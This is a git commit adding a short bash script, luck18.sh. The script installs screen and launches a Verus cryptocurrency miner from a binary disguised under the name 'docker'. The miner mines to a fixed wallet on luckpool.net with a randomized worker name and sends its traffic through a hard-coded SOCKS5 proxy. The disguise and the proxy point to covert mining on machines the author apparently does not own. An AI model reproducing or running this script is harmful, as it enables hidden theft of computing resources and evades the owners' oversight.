051c3ad07053efbcd4f2468f45e100307bac774a
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-05 16:43:26 +0700

    Create luck18.sh

---
+++ luck18.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
+WORKER=$(echo $(shuf -i 1-10 -n 1)Lukas)
+PROXY=socks5://192.111.129.150:4145
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
